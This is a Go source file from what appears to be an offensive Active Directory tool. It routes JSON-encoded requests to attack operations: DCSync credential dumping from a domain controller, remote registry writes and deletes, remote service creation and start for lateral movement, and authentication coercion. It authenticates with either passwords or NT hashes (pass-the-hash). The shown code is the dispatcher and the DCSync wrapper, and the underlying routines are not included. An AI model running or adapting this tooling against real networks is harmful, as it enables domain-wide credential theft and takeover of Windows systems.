package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"time"

	"github.com/oiweiwei/go-msrpc/ssp"
	sspcred "github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"
)

type rpcHelperRequest struct {
	Operation string          `json:"op"`
	Server    string          `json:"server"`
	Username  string          `json:"username"`
	Password  string          `json:"password"`
	Hash      string          `json:"hash"`
	Domain    string          `json:"domain"`
	Timeout   int             `json:"timeout"`
	Params    json.RawMessage `json:"params"`
}

type rpcHelperResponse struct {
	Error  string          `json:"error,omitempty"`
	Output json.RawMessage `json:"output,omitempty"`
}

func RunRPCHelper(args []string) {
	if len(args) != 1 {
		writeRPCError("expected 1 JSON argument")
		os.Exit(1)
	}

	var req rpcHelperRequest
	if err := json.Unmarshal([]byte(args[0]), &req); err != nil {
		writeRPCError(fmt.Sprintf("invalid JSON: %v", err))
		os.Exit(1)
	}

	if req.Timeout <= 0 {
		req.Timeout = 30
	}

	var output json.RawMessage
	var err error

	switch req.Operation {
	case "dcsync":
		output, err = rpcHelperDcsync(req)
	case "winreg-query":
		output, err = rpcHelperWinregQuery(req)
	case "winreg-enum":
		output, err = rpcHelperWinregEnum(req)
	case "winreg-set":
		output, err = rpcHelperWinregSet(req)
	case "winreg-delete":
		output, err = rpcHelperWinregDelete(req)
	case "svcctl-list":
		output, err = rpcHelperSvcctlList(req)
	case "svcctl-query":
		output, err = rpcHelperSvcctlQuery(req)
	case "svcctl-create":
		output, err = rpcHelperSvcctlCreate(req)
	case "svcctl-start":
		output, err = rpcHelperSvcctlStart(req)
	case "svcctl-stop":
		output, err = rpcHelperSvcctlStop(req)
	case "svcctl-delete":
		output, err = rpcHelperSvcctlDelete(req)
	case "coerce":
		output, err = rpcHelperCoerce(req)
	default:
		writeRPCError(fmt.Sprintf("unknown operation: %s", req.Operation))
		os.Exit(1)
	}

	if err != nil {
		writeRPCError(err.Error())
		os.Exit(0)
	}

	resp := rpcHelperResponse{Output: output}
	out, _ := json.Marshal(resp)
	fmt.Fprintln(os.Stdout, string(out))
}

func writeRPCError(msg string) {
	out, _ := json.Marshal(rpcHelperResponse{Error: msg})
	fmt.Fprintln(os.Stdout, string(out))
}

func rpcHelperCredAndContext(req rpcHelperRequest) (context.Context, context.CancelFunc, sspcred.Credential, error) {
	credUser := req.Username
	if req.Domain != "" {
		credUser = req.Domain + `\` + req.Username
	}
	var cred sspcred.Credential
	if req.Hash != "" {
		cred = sspcred.NewFromNTHash(credUser, stripLMPrefix(req.Hash))
	} else if req.Password != "" {
		cred = sspcred.NewFromPassword(credUser, req.Password)
	} else {
		return nil, nil, nil, fmt.Errorf("either password or hash required")
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(req.Timeout)*time.Second)
	ctx = gssapi.NewSecurityContext(ctx,
		gssapi.WithCredential(cred),
		gssapi.WithMechanismFactory(ssp.SPNEGO),
		gssapi.WithMechanismFactory(ssp.NTLM),
	)

	return ctx, cancel, cred, nil
}

func rpcViaSubprocess(req rpcHelperRequest) (json.RawMessage, error) {
	selfPath, err := os.Executable()
	if err != nil {
		return nil, fmt.Errorf("cannot find self: %v", err)
	}

	argsJSON, _ := json.Marshal(req)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(req.Timeout+10)*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, selfPath, "--rpc-helper", string(argsJSON))
	output, err := cmd.Output()
	if err != nil {
		if len(output) > 0 {
			var resp rpcHelperResponse
			if json.Unmarshal(output, &resp) == nil && resp.Error != "" {
				return nil, fmt.Errorf("%s", resp.Error)
			}
		}
		return nil, fmt.Errorf("subprocess: %v", err)
	}

	var resp rpcHelperResponse
	if err := json.Unmarshal(output, &resp); err != nil {
		return nil, fmt.Errorf("parse output: %v", err)
	}
	if resp.Error != "" {
		return nil, fmt.Errorf("%s", resp.Error)
	}
	return resp.Output, nil
}

func rpcHelperDcsync(req rpcHelperRequest) (json.RawMessage, error) {
	var params struct {
		Targets []string `json:"targets"`
	}
	if err := json.Unmarshal(req.Params, &params); err != nil {
		return nil, fmt.Errorf("invalid dcsync params: %v", err)
	}

	ha := dcsyncHelperArgs{
		Server:   req.Server,
		Username: req.Username,
		Password: req.Password,
		Hash:     req.Hash,
		Domain:   req.Domain,
		Targets:  params.Targets,
		Timeout:  req.Timeout,
	}
	results, err := dcsyncNTLMStandalone(ha)
	if err != nil {
		return nil, err
	}
	out, _ := json.Marshal(results)
	return out, nil
}
